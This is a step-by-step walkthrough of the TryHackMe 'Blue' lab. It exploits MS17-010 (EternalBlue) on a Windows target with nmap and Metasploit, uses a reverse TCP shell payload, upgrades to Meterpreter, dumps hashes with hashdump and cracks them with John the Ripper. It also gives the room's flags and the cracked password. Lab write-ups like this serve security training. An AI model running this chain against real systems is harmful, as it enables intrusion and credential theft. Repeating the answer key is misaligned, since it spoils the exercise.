# Blue - TryHackMe

> Deploy and hack into a Windows machine, leveraging common misconfigurations

**Room Link:** https://tryhackme.com/room/blue

<img width="1534" height="784" alt="image" src="https://github.com/user-attachments/assets/06c077cd-27b9-4701-9cd0-33b6df118557" />

---

## Task 1: Recon

### Scan the Machine

Time to scan the target! If you're new to scanning, check out the Nmap room first.

**Scan command:**
```bash
nmap -sS -Pn -A -p- -T5 $ip
```

**Scan breakdown:**
- `-sS` - SYN scan (stealth scan)
- `-Pn` - Skip ping (treat host as online)
- `-A` - Aggressive scan (OS detection, version detection, scripts, traceroute)
- `-p-` - Scan all 65535 ports
- `-T5` - Insane timing (fastest)

**No answer needed**

---

### Questions

**How many ports are open with a port number under 1000?**

From the scan results, we can see 3 ports are open under port 1000.

- Answer: `3`

---

**What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)**

Let's use an Nmap script to check for vulnerabilities:

```bash
nmap -sS -Pn -p 445 $ip --script smb-vuln-ms17-010.nse
```

The script reveals the machine is vulnerable to MS17-010 (EternalBlue)!

- Answer: `ms17-010`

---

## Task 2: Gain Access

### Start Metasploit

Launch Metasploit console:
```bash
msfconsole
```

**No answer needed**

---

### Questions

**Find the exploitation code we will run against the machine. What is the full path of the code?**

Search for MS17-010 exploits:
```bash
search ms17-010
```

The first result is what we need!

- Answer: `exploit/windows/smb/ms17_010_eternalblue`

---

**Show options and set the one required value. What is the name of this value?**

Use the exploit and check options:
```bash
use exploit/windows/smb/ms17_010_eternalblue
show options
```

We can see one required field: RHOSTS

- Answer: `RHOSTS`

---

**Set RHOSTS and payload**

Set the target IP:
```bash
set RHOSTS [target_ip]
```

Set the payload:
```bash
set payload windows/x64/shell/reverse_tcp
```

**No answer needed**

---

**With that done, run the exploit!**

Launch the exploit:
```bash
run
```

Wait for the magic to happen!

**No answer needed**

---

**Confirm that the exploit has run correctly**

After waiting a bit, you should get a shell!

Press Enter if the DOS shell doesn't appear immediately.

Background the shell with **CTRL+Z** if needed.

**Note:** If this fails, reboot the target VM and try again.

**No answer needed**

---

## Task 3: Escalate

### Convert to Meterpreter

Background your shell (CTRL+Z) and let's upgrade to Meterpreter!

**Search for the conversion module:**
```bash
search shell_to_meterpreter
```

**No answer needed**

---

### Questions

**What is the name of the post module we will use?**

From the search results, we can see the module path.

- Answer: `post/multi/manage/shell_to_meterpreter`

---

**Select this module. Show options, what option are we required to change?**

```bash
use post/multi/manage/shell_to_meterpreter
show options
```

We need to set the session ID!

- Answer: `SESSION`

---

**Set the required option**

Set the session (check with `sessions -l`):
```bash
set SESSION 1
set LHOST [your_ip]
```

**No answer needed**

---

**Run the module**

```bash
run
```

Wait for the conversion to complete!

**No answer needed**

---

**Once the meterpreter shell conversion completes, select that session for use**

Switch to the Meterpreter session:
```bash
sessions -i 1
```

**No answer needed**

---

**Verify escalation to NT AUTHORITY\SYSTEM**

Confirm privilege level:
```bash
getsystem
```

You can also check with:
```bash
shell
whoami
exit
```

**No answer needed**

---

**List all running processes**

```bash
ps
```

Find a process running as NT AUTHORITY\SYSTEM (towards the bottom of the list).

Write down the Process ID (PID) from the far left column.

**No answer needed**

---

**Migrate to a stable process**

```bash
migrate [PROCESS_ID]
```

Example:
```bash
migrate 2596
```

**Note:** This may take several attempts. If it fails, try a different process.

**No answer needed**

---

## Task 4: Cracking

### Dump Password Hashes

**Within our elevated meterpreter shell, run hashdump**

```bash
hashdump
```

This dumps all password hashes from the system!

**No answer needed**

---

### Questions

**What is the name of the non-default user?**

Look at the hashdump output. You'll see the non-default user account.

- Answer: `Jon`

---

**Copy this password hash to a file and crack it. What is the cracked password?**

Copy Jon's hash to a file (hash.txt):
```bash
Jon:1000:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH]:::
```

Crack it with John the Ripper:
```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

- Answer: `alqfna22`

---

## Task 5: Find flags!

Time to hunt for flags!

### Questions

**Flag1? This flag can be found at the system root.**

Search for the flag:
```bash
search -f flag1.txt
cat C:\flag1.txt
```

- Answer: `flag{access_the_machine}`

---

**Flag2? This flag can be found at the location where passwords are stored within Windows.**

Search for the second flag:
```bash
search -f flag2.txt
```

Windows stores passwords in the SAM database, typically located in:
`C:\Windows\System32\config`

Read the flag:
```bash
cat C:\Windows\System32\config\flag2.txt
```

- Answer: `flag{sam_database_elevated_access}`

---

**Flag3? This flag can be found in an excellent location to loot. Administrators usually have interesting things saved.**

Search for the final flag:
```bash
search -f flag3.txt
```

Check the Administrator's Documents folder:
```bash
cat C:\Users\Jon\Documents\flag3.txt
```

- Answer: `flag{admin_documents_can_be_valuable}`

---

## Quick Reference

### Nmap Scanning

| Command | Purpose |
|---------|---------|
| `nmap -sS -Pn -A -p- -T5 [ip]` | Comprehensive scan |
| `nmap --script smb-vuln-ms17-010 -p 445 [ip]` | Check MS17-010 vulnerability |

### Metasploit Commands

| Command | Purpose |
|---------|---------|
| `msfconsole` | Start Metasploit |
| `search [term]` | Search for modules |
| `use [module]` | Select module |
| `show options` | View parameters |
| `set [param] [value]` | Set parameter |
| `run` or `exploit` | Execute module |
| `sessions -l` | List sessions |
| `sessions -i [ID]` | Interact with session |
| `background` | Background session |

### Meterpreter Commands

| Command | Purpose |
|---------|---------|
| `getsystem` | Attempt privilege escalation |
| `getuid` | Show current user |
| `ps` | List processes |
| `migrate [PID]` | Move to another process |
| `hashdump` | Dump password hashes |
| `search -f [filename]` | Find files |
| `cat [file]` | Read file contents |
| `shell` | Drop to command shell |

### Password Cracking

| Command | Purpose |
|---------|---------|
| `john --format=NT --wordlist=rockyou.txt hash.txt` | Crack NTLM hash |

### Common Windows Locations

| Location | Purpose |
|----------|---------|
| `C:\` | System root |
| `C:\Windows\System32\config` | SAM database location |
| `C:\Users\[username]\Documents` | User documents |
| `C:\Users\[username]\Desktop` | User desktop |

---

## Attack Chain Summary

1. **Reconnaissance** - Scan target with Nmap
2. **Vulnerability Discovery** - Identify MS17-010
3. **Exploitation** - Use EternalBlue exploit
4. **Shell Upgrade** - Convert to Meterpreter
5. **Privilege Escalation** - Get SYSTEM privileges
6. **Process Migration** - Stabilize session
7. **Credential Harvesting** - Dump password hashes
8. **Password Cracking** - Crack NTLM hashes
9. **Flag Collection** - Find all flags

---

## Key Takeaways

- **MS17-010 (EternalBlue)** is a critical SMB vulnerability
- **Nmap scripts** can quickly identify vulnerabilities
- **Meterpreter** provides more features than basic shells
- **Process migration** helps maintain stable sessions
- **hashdump** extracts Windows password hashes
- **NTLM hashes** can be cracked with wordlists
- **System root** is usually `C:\`
- **SAM database** stores Windows passwords
- **Administrator documents** often contain sensitive info
- Always **background sessions** before switching modules

This is a classic Windows exploitation scenario. Understanding EternalBlue and the MS17-010 vulnerability is essential for any penetration tester!
